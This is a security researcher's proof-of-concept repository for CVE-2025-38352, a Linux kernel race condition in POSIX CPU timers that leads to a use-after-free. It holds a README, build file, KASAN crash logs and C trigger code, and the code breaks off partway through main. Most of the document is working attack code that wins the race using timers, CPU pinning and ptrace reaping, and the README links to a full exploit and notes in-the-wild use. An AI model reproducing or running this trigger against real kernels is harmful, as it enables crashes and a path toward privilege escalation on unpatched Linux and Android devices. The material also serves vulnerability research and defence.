Project Path: arc_farazsth98_poc-CVE-2025-38352_kiowo_ev

Source Tree:

```txt
arc_farazsth98_poc-CVE-2025-38352_kiowo_ev
â”œâ”€â”€ Makefile
â”œâ”€â”€ README.md
â”œâ”€â”€ demo.gif
â”œâ”€â”€ example_kasan_log.txt
â”œâ”€â”€ example_non_kasan_log.txt
â”œâ”€â”€ poc.c
â”œâ”€â”€ profile_handle_posix_cpu_timers.c
â””â”€â”€ profiler_patch.diff

```

`Makefile`:

```
all:
	gcc -o poc -static poc.c

clean:
	rm -f poc

```

`README.md`:

```md
# Exploit Details

This repository only contains the proof-of-concept that triggers the vulnerability.

I have since written a full exploit for this vulnerability. You can find the details in the link below.

https://github.com/farazsth98/chronomaly

# Analysis Blog Posts

- Part 1 - https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/
- Part 2 - https://faith2dxy.xyz/2025-12-24/cve_2025_38352_analysis_part_2/

# Demo

![demo](./demo.gif)

# PoC Notes

The PoC really depends on how CPU time is consumed by the `getpid` system call.

To that end, I've ensured to make the PoC as system-agnostic as possible - that is, it should work on your system even if the `getpid` system call uses up drastically more / less time than on my system.

# Description

This is a PoC for CVE-2025-38352, a race condition vulnerability in the Linux kernel's POSIX CPU timers implementation. The September 2025 Android Bulletin mentions that this vulnerability has been used in limited, targeted exploitation in the wild. 

It was written for LTS 6.12.33, and requires `CONFIG_POSIX_CPU_TIMERS_TASK_WORK` to be turned off in the kernel config. Additionally, I also turned on full preemption (`CONFIG_PREEMPT=y`) as that's what the Android kernel uses.

Once the race is won, it leads to a use-after-free of a `struct k_itimer`.

For more information on setting up the testing environment, please refer to the blog post linked above, specifically the "Testing Environment TL;DR section".

NOTE: No patches are required for this PoC to work (putting this here because my last PoC kind of needed a 500ms `mdelay` ðŸ˜…).

# Reliability

The PoC has always triggered for me within 100 retries (it's never actually reached more than 60 retries). Reliability can be improved in a few places IMO, but I'll work on that later.

# Profiler patch

The `profiler_patch.diff` file contains a patch to apply some profiling code to `handle_posix_cpu_timers()`. It is useful for figuring out how to extend the race window, as it prints out the amount of execution time used by the `firing` list iteration [here](https://elixir.bootlin.com/linux/v6.12.33/source/kernel/time/posix-cpu-timers.c#L1365-L1389).

# Running the PoC

Compile with the provided `Makefile` and just run it with `/poc`.

If you want to run the profiler, compile it the same way as the PoC.

# Questions?

Hit me up on Twitter or wherever else if you have any questions.

```

`example_kasan_log.txt`:

```txt
~ $ /poc
Wrapper: try 1
Wrapper: try 2
[   44.418521] ==================================================================
[   44.422116] BUG: KASAN: slab-use-after-free in posix_timer_queue_signal+0x16a/0x1a0
[   44.425623] Write of size 4 at addr ffff88800b9293b8 by task REAPEE/4428
[   44.428833]
[   44.429388] CPU: 2 UID: 1000 PID: 4428 Comm: REAPEE Not tainted 6.12.33 #14
[   44.429393] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   44.429395] Call Trace:
[   44.429398]  <IRQ>
[   44.429400]  dump_stack_lvl+0x66/0x80
[   44.429406]  print_report+0xc1/0x610
[   44.429412]  ? posix_timer_queue_signal+0x16a/0x1a0
[   44.429415]  kasan_report+0xaf/0xe0
[   44.429418]  ? posix_timer_queue_signal+0x16a/0x1a0
[   44.429422]  posix_timer_queue_signal+0x16a/0x1a0
[   44.429425]  cpu_timer_fire+0x8d/0x190
[   44.429428]  run_posix_cpu_timers+0x931/0x1850
[   44.429432]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429436]  ? __pfx_run_posix_cpu_timers+0x10/0x10
[   44.429439]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429441]  ? tmigr_requires_handle_remote+0x275/0x340
[   44.429447]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429450]  tick_nohz_handler+0x2a7/0x450
[   44.429454]  ? __pfx_tick_nohz_handler+0x10/0x10
[   44.429457]  __hrtimer_run_queues+0x34b/0x7b0
[   44.429461]  ? __pfx___hrtimer_run_queues+0x10/0x10
[   44.429463]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429466]  ? ktime_get_update_offsets_now+0x83/0x2a0
[   44.429469]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[   44.429474]  hrtimer_interrupt+0x2ce/0x770
[   44.429479]  __sysvec_apic_timer_interrupt+0xc1/0x2e0
[   44.429484]  sysvec_apic_timer_interrupt+0x71/0x90
[   44.429487]  </IRQ>
[   44.429489]  <TASK>
[   44.429490]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[   44.429493] RIP: 0010:__kasan_check_write+0x8/0x20
[   44.429497] Code: f1 ff ff 66 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8b 0c 24 <89> f6 ba 01 00 00 0
[   44.429500] RSP: 0018:ffff8880149dfda8 EFLAGS: 00000246
[   44.429503] RAX: 0000000000000001 RBX: 1ffff1100293bfb6 RCX: ffffffff859b5105
[   44.429505] RDX: ffffed1001bb1589 RSI: 0000000000000004 RDI: ffff8880149dfdd0
[   44.429507] RBP: ffff88800dd8ac40 R08: 0000000000000001 R09: ffffed1001bb1588
[   44.429509] R10: ffff88800dd8ac43 R11: 0000000000000000 R12: ffff8880149dfeb0
[   44.429510] R13: ffff8880149dfeb0 R14: dffffc0000000000 R15: ffff8880149df858
[   44.429513]  ? _raw_spin_lock+0x85/0xe0
[   44.429517]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429520]  _raw_spin_lock+0x85/0xe0
[   44.429523]  ? __pfx__raw_spin_lock+0x10/0x10
[   44.429526]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429529]  mpol_put_task_policy+0x1f/0x80
[   44.429533]  do_exit+0x110c/0x24f0
[   44.429538]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429540]  ? __x64_sys_rt_sigprocmask+0x169/0x230
[   44.429543]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.429546]  ? __pfx_do_exit+0x10/0x10
[   44.429550]  __x64_sys_exit+0x42/0x50
[   44.429553]  x64_sys_call+0x183f/0x1840
[   44.429556]  do_syscall_64+0x5a/0x120
[   44.429560]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   44.429562] RIP: 0033:0x41c18e
[   44.429565] Code: Unable to access opcode bytes at 0x41c164.
[   44.429567] RSP: 002b:00007bf6030001e0 EFLAGS: 00000246 ORIG_RAX: 000000000000003c
[   44.429569] RAX: ffffffffffffffda RBX: 00007bf603000640 RCX: 000000000041c18e
[   44.429571] RDX: 000000000000003c RSI: 00000000007fc000 RDI: 0000000000000000
[   44.429573] RBP: 00007bf602800000 R08: 0000114c00000000 R09: 0000114c00000000
[   44.429574] R10: 0000000000000008 R11: 0000000000000246 R12: 00007bf603000640
[   44.429576] R13: 0000000000000000 R14: 000000000041bef0 R15: 00007bf602800000
[   44.429580]  </TASK>
[   44.429581]
[   44.585281] Allocated by task 4428:
[   44.587062]  kasan_save_stack+0x24/0x50
[   44.588969]  kasan_save_track+0x14/0x30
[   44.590914]  __kasan_slab_alloc+0x59/0x70
[   44.592904]  kmem_cache_alloc_noprof+0x111/0x340
[   44.595182]  __sigqueue_alloc+0x110/0x2e0
[   44.597168]  do_timer_create+0x142/0x10f0
[   44.599093]  __x64_sys_timer_create+0x143/0x190
[   44.601496]  do_syscall_64+0x5a/0x120
[   44.603350]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   44.605962]
[   44.606851] Freed by task 4427:
[   44.608470]  kasan_save_stack+0x24/0x50
[   44.610421]  kasan_save_track+0x14/0x30
[   44.612415]  kasan_save_free_info+0x3b/0x60
[   44.614530]  __kasan_slab_free+0x38/0x50
[   44.616441]  kmem_cache_free+0x1be/0x510
[   44.618500]  posix_timer_unhash_and_free+0x107/0x160
[   44.620876]  __x64_sys_timer_delete+0x246/0x320
[   44.623242]  do_syscall_64+0x5a/0x120
[   44.625097]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   44.627660]
[   44.628482] The buggy address belongs to the object at ffff88800b929380
[   44.628482]  which belongs to the cache sigqueue of size 80
[   44.634383] The buggy address is located 56 bytes inside of
[   44.634383]  freed 80-byte region [ffff88800b929380, ffff88800b9293d0)
[   44.640413]
[   44.641165] The buggy address belongs to the physical page:
[   44.644047] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xb929
[   44.647961] anon flags: 0x100000000000000(node=0|zone=1)
[   44.650690] page_type: f5(slab)
[   44.652246] raw: 0100000000000000 ffff88800ab78dc0 ffffea000090c200 dead000000000005
[   44.656133] raw: 0000000000000000 0000000080240024 00000001f5000000 0000000000000000
[   44.659978] page dumped because: kasan: bad access detected
[   44.662841]
[   44.663617] Memory state around the buggy address:
[   44.666016]  ffff88800b929280: fc fc fc fc 00 00 00 00 00 00 00 00 00 00 fc fc
[   44.669495]  ffff88800b929300: fc fc fa fb fb fb fb fb fb fb fb fb fc fc fc fc
[   44.672979] >ffff88800b929380: fa fb fb fb fb fb fb fb fb fb fc fc fc fc 00 00
[   44.676459]                                         ^
[   44.678849]  ffff88800b929400: 00 00 00 00 00 00 00 00 fc fc fc fc fa fb fb fb
[   44.682437]  ffff88800b929480: fb fb fb fb fb fb fc fc fc fc fa fb fb fb fb fb
[   44.686294] ==================================================================
[   44.689892] Disabling lock debugging due to kernel taint
[   44.692465] ------------[ cut here ]------------
[   44.694820] WARNING: CPU: 2 PID: 4428 at kernel/signal.c:1974 send_sigqueue+0x492/0x750
[   44.698659] Modules linked in:
[   44.700205] CPU: 2 UID: 1000 PID: 4428 Comm: REAPEE Tainted: G    B              6.12.33 #14
[   44.704506] Tainted: [B]=BAD_PAGE
[   44.706076] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   44.710137] RIP: 0010:send_sigqueue+0x492/0x750
[   44.712496] Code: df 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 a1 02 00 00 49 8b 87 10 08 00 00 48 8d 50 40 e9 a5 fd ff ff 41 bc ff ff ff ff eb ab <0f> 0b 45 31 e4 eb 2
[   44.721812] RSP: 0018:ffff8880a3909c58 EFLAGS: 00010002
[   44.724314] RAX: 0000000000000000 RBX: 0000000000000001 RCX: ffffffff814931be
[   44.727721] RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffff88800b929390
[   44.731254] RBP: ffff88800b27cd80 R08: 0000000000000001 R09: fffffbfff1402558
[   44.734800] R10: ffffffff8a012ac7 R11: 6e696c6261736944 R12: 0000000000000001
[   44.738112] R13: ffff88800b929380 R14: ffff8880a3909cc0 R15: ffff888009b36d28
[   44.741483] FS:  0000000000000000(0000) GS:ffff8880a3900000(0000) knlGS:0000000000000000
[   44.745470] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   44.748318] CR2: 00000000004c9e88 CR3: 000000000c3c2000 CR4: 0000000000350ef0
[   44.751834] Call Trace:
[   44.753042]  <IRQ>
[   44.754126]  posix_timer_queue_signal+0x13f/0x1a0
[   44.756353]  cpu_timer_fire+0x8d/0x190
[   44.758146]  run_posix_cpu_timers+0x931/0x1850
[   44.760286]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.762540]  ? __pfx_run_posix_cpu_timers+0x10/0x10
[   44.765093]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.767400]  ? tmigr_requires_handle_remote+0x275/0x340
[   44.769981]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.772288]  tick_nohz_handler+0x2a7/0x450
[   44.774259]  ? __pfx_tick_nohz_handler+0x10/0x10
[   44.776485]  __hrtimer_run_queues+0x34b/0x7b0
[   44.778940]  ? __pfx___hrtimer_run_queues+0x10/0x10
[   44.781645]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.784702]  ? ktime_get_update_offsets_now+0x83/0x2a0
[   44.787224]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[   44.789547]  hrtimer_interrupt+0x2ce/0x770
[   44.791534]  __sysvec_apic_timer_interrupt+0xc1/0x2e0
[   44.794106]  sysvec_apic_timer_interrupt+0x71/0x90
[   44.796567]  </IRQ>
[   44.798416]  <TASK>
[   44.799500]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[   44.802098] RIP: 0010:__kasan_check_write+0x8/0x20
[   44.804430] Code: f1 ff ff 66 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8b 0c 24 <89> f6 ba 01 00 00 0
[   44.813619] RSP: 0018:ffff8880149dfda8 EFLAGS: 00000246
[   44.816298] RAX: 0000000000000001 RBX: 1ffff1100293bfb6 RCX: ffffffff859b5105
[   44.819784] RDX: ffffed1001bb1589 RSI: 0000000000000004 RDI: ffff8880149dfdd0
[   44.823323] RBP: ffff88800dd8ac40 R08: 0000000000000001 R09: ffffed1001bb1588
[   44.826930] R10: ffff88800dd8ac43 R11: 0000000000000000 R12: ffff8880149dfeb0
[   44.830442] R13: ffff8880149dfeb0 R14: dffffc0000000000 R15: ffff8880149df858
[   44.833927]  ? _raw_spin_lock+0x85/0xe0
[   44.835916]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.838346]  _raw_spin_lock+0x85/0xe0
[   44.840301]  ? __pfx__raw_spin_lock+0x10/0x10
[   44.842616]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.845522]  mpol_put_task_policy+0x1f/0x80
[   44.847663]  do_exit+0x110c/0x24f0
[   44.849338]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.851697]  ? __x64_sys_rt_sigprocmask+0x169/0x230
[   44.854188]  ? srso_alias_return_thunk+0x5/0xfbef5
[   44.856599]  ? __pfx_do_exit+0x10/0x10
[   44.858720]  __x64_sys_exit+0x42/0x50
[   44.860515]  x64_sys_call+0x183f/0x1840
[   44.862507]  do_syscall_64+0x5a/0x120
[   44.864422]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   44.866902] RIP: 0033:0x41c18e
[   44.868429] Code: Unable to access opcode bytes at 0x41c164.
[   44.871157] RSP: 002b:00007bf6030001e0 EFLAGS: 00000246 ORIG_RAX: 000000000000003c
[   44.874864] RAX: ffffffffffffffda RBX: 00007bf603000640 RCX: 000000000041c18e
[   44.878497] RDX: 000000000000003c RSI: 00000000007fc000 RDI: 0000000000000000
[   44.882092] RBP: 00007bf602800000 R08: 0000114c00000000 R09: 0000114c00000000
[   44.885415] R10: 0000000000000008 R11: 0000000000000246 R12: 00007bf603000640
[   44.888918] R13: 0000000000000000 R14: 000000000041bef0 R15: 00007bf602800000
[   44.892427]  </TASK>
[   44.893513] ---[ end trace 0000000000000000 ]---

```

`example_non_kasan_log.txt`:

```txt
~ $ /poc
Wrapper: try 1
Wrapper: try 2
[    3.089984] ------------[ cut here ]------------
[    3.092190] WARNING: CPU: 2 PID: 10156 at kernel/signal.c:1974 send_sigqueue+0x1cd/0x280
[    3.095976] Modules linked in:
[    3.097418] CPU: 2 UID: 0 PID: 10156 Comm: REAPEE Not tainted 6.12.33 #16
[    3.100730] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[    3.104785] RIP: 0010:send_sigqueue+0x1cd/0x280
[    3.106884] Code: 44 89 e0 5b 5d 41 5c 41 5d 41 5e 41 5f e9 66 b0 94 01 48 8b 85 10 08 00 00 48 8d 50 40 e9 2d ff ff ff 41 bc ff ff ff ff eb cd <0f> 0b 45 31 e4 eb d
[    3.115640] RSP: 0018:ffffc90000144e40 EFLAGS: 00010002
[    3.118133] RAX: 0000000000000001 RBX: ffff888012d7a100 RCX: ffffc90000144ea8
[    3.121749] RDX: 0000000000000001 RSI: ffff888008649f00 RDI: ffff888006993410
[    3.125299] RBP: ffff888012d7a1a8 R08: ffff888012d7a1a8 R09: ffff888012d7a1a8
[    3.128738] R10: 0000000000000117 R11: 0000000000000001 R12: ffffc90000144e00
[    3.132062] R13: ffffc90000144ea8 R14: ffff888012d7a120 R15: ffff8880bcb25a00
[    3.135302] FS:  0000000000000000(0000) GS:ffff8880bcb00000(0000) knlGS:0000000000000000
[    3.138910] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.141720] CR2: 0000000000401f78 CR3: 0000000008bde000 CR4: 0000000000350ef0
[    3.145319] Call Trace:
[    3.146608]  <IRQ>
[    3.147663]  posix_timer_queue_signal+0x3f/0x50
[    3.149813]  cpu_timer_fire+0x23/0x70
[    3.151619]  run_posix_cpu_timers+0x2a1/0x590
[    3.153643]  tick_nohz_handler+0x8f/0x130
[    3.155604]  ? __pfx_tick_nohz_handler+0x10/0x10
[    3.157864]  __hrtimer_run_queues+0x12c/0x300
[    3.159834]  ? srso_alias_return_thunk+0x5/0xfbef5
[    3.162094]  hrtimer_interrupt+0x103/0x240
[    3.164198]  __sysvec_apic_timer_interrupt+0x5d/0x130
[    3.166634]  sysvec_apic_timer_interrupt+0x70/0x90
[    3.168952]  </IRQ>
[    3.169805]  <TASK>
[    3.171022]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[    3.173445] RIP: 0010:_raw_write_unlock_irq+0x12/0x30
[    3.175882] Code: cd 77 fe e9 1b 58 27 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 0f 1f 44 00 00 c6 07 00 fb 0f 1f 44 00 00 <65> ff 0d af 5f 7a 7
[    3.184703] RSP: 0018:ffffc90000427ec8 EFLAGS: 00000246
[    3.187196] RAX: ffff8880087572c0 RBX: ffff8880240310c0 RCX: 0000000000000830
[    3.190611] RDX: ffff888006591568 RSI: 0000000000000056 RDI: ffffffff84406080
[    3.194148] RBP: ffffffff844946e0 R08: 00000000d7e630eb R09: 0000000000000001
[    3.197586] R10: 0000000000000012 R11: 0000000000000000 R12: ffffc90000427ee0
[    3.201056] R13: ffff88800873b900 R14: ffff888008be3528 R15: ffff888005f42180
[    3.204399]  ? srso_alias_return_thunk+0x5/0xfbef5
[    3.206770]  do_exit+0x613/0xb00
[    3.208354]  ? srso_alias_return_thunk+0x5/0xfbef5
[    3.210743]  __x64_sys_exit+0x1b/0x20
[    3.212501]  x64_sys_call+0x183f/0x1840
[    3.214379]  do_syscall_64+0x5a/0x120
[    3.216127]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    3.218531] RIP: 0033:0x41be8e
[    3.220076] Code: Unable to access opcode bytes at 0x41be64.
[    3.222823] RSP: 002b:00007eaf6b57b1e0 EFLAGS: 00000246 ORIG_RAX: 000000000000003c
[    3.226438] RAX: ffffffffffffffda RBX: 00007eaf6b57b640 RCX: 000000000041be8e
[    3.229714] RDX: 000000000000003c RSI: 00000000007fc000 RDI: 0000000000000000
[    3.233051] RBP: 00007eaf6ad7b000 R08: 000027ac00000000 R09: 000027ac00000000
[    3.236656] R10: 0000000000000008 R11: 0000000000000246 R12: 00007eaf6b57b640
[    3.240069] R13: 0000000000000000 R14: 000000000041bbf0 R15: 00007eaf6ad7b000
[    3.243459]  </TASK>
[    3.244525] ---[ end trace 0000000000000000 ]---

```

`poc.c`:

```c
#define _GNU_SOURCE
#include <time.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdlib.h>
#include <err.h>
#include <sys/prctl.h>
#include <sched.h>
#include <linux/membarrier.h>
#include <sys/syscall.h>
#include <sys/signalfd.h>
#include <poll.h>
#include <errno.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <linux/futex.h>

#define SYSCHK(x) ({            \
    typeof(x) __res = (x);      \
    if (__res == (typeof(x))-1) \
      err(1, "SYSCHK(" #x ")"); \
    __res;                      \
})

#define NUM_SAMPLES 100000
#define NUM_TIMERS 18
#define NUM_PAD_TIMERS 14
#define ONE_MS_NS 1000000uLL
#define SYSCALL_LOOP_TIMES_MAX 1000
#define CPU_USAGE_THRESHOLD 5000 // Target dependent
#define PAGE_SIZE 0x1000uLL

struct shared_mem {
    int sync;   // futex word
};

void pin_on_cpu(int i) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void wait_for_rcu() {
    syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0);
}

static inline long long ts_to_ns(const struct timespec *ts) {
    return (long long)ts->tv_sec * 1000000000LL + (long long)ts->tv_nsec;
}

static int futex_wake(int *uaddr, int n) {
    return (int)syscall(__NR_futex, uaddr, FUTEX_WAKE, n, NULL, NULL, 0);
}

static int futex_wait(int *uaddr, int expected) {
    return (int)syscall(__NR_futex, uaddr, FUTEX_WAIT, expected, NULL, NULL, 0);
}


static long int clock_gettime_avg = 0;

// Can overflow if `NUM_SAMPLES` is too high, but with simple syscalls,
// this works just fine
long int getpid_cpu_usage() {
    struct timespec *ts = malloc(NUM_SAMPLES * sizeof(struct timespec));

    // If we don't have `clock_gettime` avg CPU time usage, get it now
    if (clock_gettime_avg == 0) {
        for (int i = 0; i < NUM_SAMPLES; i++) {
            syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        } 
    
        long int total_nsec = 0;
    
        for (int i = 0; i < NUM_SAMPLES-1; i++) {
            long int time_taken = (long int)(ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]));
            total_nsec += time_taken;
        }
    
        clock_gettime_avg = total_nsec / (NUM_SAMPLES-1);
    }

    for (int i = 0; i < NUM_SAMPLES; i++) {
        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        syscall(__NR_getpid);
    }

    long int total_nsec = 0;
    for (int i = 0; i < NUM_SAMPLES-1; i++) {
        long int time_taken = (long int)(ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i])) - clock_gettime_avg;
        total_nsec += time_taken;
    }

    free(ts);
    return total_nsec / (NUM_SAMPLES-1);
}

/* Global variables for exploit setup START */
pthread_barrier_t barrier;

// Timers used to stall `handle_posix_cpu_timers()` to extend the race window
timer_t stall_timers[NUM_TIMERS];
timer_t pad_timers[NUM_PAD_TIMERS]; // Pad the slab of stall timers with this

// Thread that will trigger the timer handling, and also the thread that will
// be reaped by the exploit parent process
pthread_t reapee_thread;

int e2w[2]; // exploit process to wrapper process comm pipefds
int c2p[2]; // child to parent comm pipefds
int p2c[2]; // parent to child comm pipefds
int stall_fds[2]; // stall pipe fds for the sleep func
int sfd; // Save SIGUSR1 signalfd for increasing race window


// Amount of LESS times to loop the `getpid()` syscall to waste CPU time
int syscall_loop_times = 0;
int race_retry_count = 0;
int full_retry_count = 0;
pid_t exploit_child_tid;

timer_t uaf_timer; // The UAF timer handler
/* Global variables for exploit setup END */

void reapee_func(void) {
    // Pin to same CPU as sleeper threads
    pin_on_cpu(1);

    // For the race condition trigger
    struct sigevent race_evt = {0};
    race_evt.sigev_notify = SIGEV_SIGNAL;
    race_evt.sigev_signo = SIGUSR1;

    // Only for one timer
    struct sigevent race_win_evt = {0};
    race_win_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
    race_win_evt.sigev_signo = SIGUSR1;
    race_win_evt._sigev_un._tid = exploit_child_tid;

    // For the UAF timer
    struct sigevent uaf_evt = {0};
    uaf_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
    uaf_evt.sigev_signo = SIGUSR2;
    uaf_evt._sigev_un._tid = exploit_child_tid;
    uaf_evt.sigev_value.sival_ptr = (void *)0x4141414141414141uLL; // Detect this UAF timer

    prctl(PR_SET_NAME, "REAPEE");

    // Send this thread's TID to the parent process
    pid_t tid = (pid_t)syscall(SYS_gettid);
    SYSCHK(write(c2p[1], &tid, sizeof(pid_t)));

    // Get the average CPU time usage of the `getpid()` syscall, so we
    // can use it for the trigger later
    long int getpid_avg = getpid_cpu_usage();

    // Wait for parent to attach and continue
    pthread_barrier_wait(&barrier); // barrier 1
    
    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &uaf_evt, &uaf_timer));

    // Create the remaining 18 timers for extending the race window
    // First timer gets race win timer
    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_win_evt, &stall_timers[0]));
    for (int i = 1; i < NUM_TIMERS; i++) {
        SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_evt, &stall_timers[i]));
    }

    // Wait for the main thread to arm the timers. This is to make sure
    // this thread does not use CPU time to arm the timers.
    pthread_barrier_wait(&barrier); // barrier 2
    pthread_barrier_wait(&barrier); // barrier 3

    // Waste just the right amount of CPU time now without firing any of the timers
    for (int i = 0; i < ((ONE_MS_NS / getpid_avg) + CPU_USAGE_THRESHOLD - syscall_loop_times); i++) {
        syscall(__NR_getpid);
    }

    // This `return` will trigger `do_exit()` in the kernel, which hopefully will
    // fire the timers after `exit_notify()` wakes up the `waitpid()` in the exploit
    // parent process
    return;
}

void sleep_func(void) {
    // same CPU as REAPEE thread
    pin_on_cpu(1);
    prctl(PR_SET_NAME, "SLEEPER");

    // Two wait conditions:
    // 1) signalfd_notify() woke up this thread
    // 2) Pipe was written to / closed to stop this function
    struct pollfd pfds[2] = {
        { .fd = sfd,          .events = POLLIN },
        { .fd = stall_fds[0],   .events = POLLIN | POLLHUP | POLLERR | POLLNVAL },   // pipe read-end
    };

    // Now poll to increase race window
    for (;;) {
        int ret = ppoll(pfds, 2, NULL, NULL);
        if (ret < 0 && errno == EINTR)
            continue;
        if (ret < 0)
            err(1, "ppoll");

        if (pfds[1].revents & (POLLIN | POLLHUP | POLLERR | POLLNVAL)) {
            break; // exit condition
        }

        // Drain the signalfd so subsequent polls will block again
        //
        // NOTE: since every thread is doing this, and there are
        //       only 19 SIGUSR1 signals queued, and because every
        //       thread is pinned to the same CPU, after 19 reads,
        //       all subsequent threads will see -EAGAIN from read().
        //       So ignore the error and just continue in that case.
        struct signalfd_siginfo si;
        read(sfd, &si, sizeof(si));

        if (pfds[0].revents) pfds[0].revents = 0;
        if (pfds[1].revents) pfds[1].revents = 0;
    }
}

int main(int argc, char *argv[]) {
    // Loop for wrapper process
    while (1) {
        // Wrapper process setup
        printf("Wrapper: try %d\n", ++full_retry_count);
        SYSCHK(pipe(e2w));
        // Write and read to allocate pipe buffer page
        char m;
        write(e2w[1], &m, 1);
        read(e2w[0], &m, 1);
        pid_t exploit_pid = SYSCHK(fork());

        if (exploit_pid) {
            // wrapper process (pinning CPU here doesn't matter)
            char m;
            close(e2w[1]);

            // Blocking read until retry
            int read_count = read(e2w[0], &m, 1);

            // If read_count > 0, retry
            if (read_count == 0) break;

            // Reset syscall_loop_times for full retry
            syscall_loop_times = 1;

            // Close pipes so they can be recreated again
            close(e2w[0]);

            // Wait for exploit to exit
            waitpid(exploit_pid, NULL, __WALL);
        } else {
            // exploit process
            char m;
            close(e2w[0]);

            // Parent and child setup
            // Use pipes to communicate between parent and child
            SYSCHK(pipe(c2p));
            SYSCHK(pipe(p2c));
            write(c2p[1], &m, 1);
            read(c2p[0], &m, 1);
            write(p2c[1], &m, 1);
            read(p2c[0], &m, 1);

            // Shared memory for fast communication
            struct shared_mem *shm = SYSCHK(mmap(NULL, sizeof(*shm),
                             PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_ANONYMOUS, -1, 0));
            
            __atomic_store_n(&shm->sync, 0, __ATOMIC_RELAXED);

            pid_t pid = SYSCHK(fork());
            
            if (pid) {
                // exploit parent process
                pin_on_cpu(0);
                char m;
                close(c2p[1]);
                close(p2c[0]);

                prctl(PR_SET_NAME, "EXPLOIT_PARENT");

                pid_t tid;

                while (1) {
                    // Receive child process's REAPEE thread's TID
                    SYSCHK(read(c2p[0], &tid, sizeof(pid_t)));
                    
                    // Reset shared memory sync variable
                    __atomic_store_n(&shm->sync, 0, __ATOMIC_RELAXED);

                    // Attach to the REAPEE thread and continue it
                    SYSCHK(ptrace(PTRACE_ATTACH, tid, NULL, NULL));
                    SYSCHK(waitpid(tid, NULL, __WALL));
                    SYSCHK(ptrace(PTRACE_CONT, tid, NULL, NULL));

                    // Signal to child that we attached and continued
                    SYSCHK(write(p2c[1], &m, 1));

                    // Reap the REAPEE thread.
                    //
                    // This will either block if it's called before `exit_notify()` acquires
                    // the `tasklist_lock` (and return immediately after it's released), or
                    // it will return immediately because `exit_notify()` already unlocked
                    // `tasklist_lock`.
                    //
                    // Either way, there's no need to sleep or waste any time here to make
                    // the race more likely to win.
                    SYSCHK(waitpid(tid, NULL, __WALL));
                    
                    // At this point, if UAF timer fired at the right time, the REAPEE thread
                    // will be reaped while it's `tsk->exit_state` is set to `EXIT_ZOMBIE`.
                    //
                    // Let the child process know REAPEE is reaped, so it can delete the
                    // timer.
                    //
                    // Use a futex here to get the lowest latency possible
                    __atomic_add_fetch(&shm->sync, 1, __ATOMIC_RELEASE);
                    futex_wake(&shm->sync, 1);

                    // Let the child process delete and free the timer, and
                    // all threads before exiting
                    SYSCHK(read(c2p[0], &m, 1));
                }
                

                // Signal to wrapper process to retry and exit
                // TODO exploit: Figure out how to detect if we triggered UAF here
                SYSCHK(write(e2w[1], &m, 1));

                // Wait for child to exit before exiting
                waitpid(pid, NULL, __WALL);
                close(e2w[1]);
                close(c2p[0]);
                close(p2c[1]);
                exit(0);
            } else {
                // exploit child process
                pin_on_cpu(2);
                close(c2p[0]);
                close(p2c[1]);

                // Make this thread the highest priority so it
                // wakes up asap any time it's blocked
                struct sched_param sp = { .sched_priority = 10 };
                SYSCHK(pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp));

                exploit_child_tid = (pid_t)syscall(SYS_gettid);

                // Pipefd for sleep threads to block on
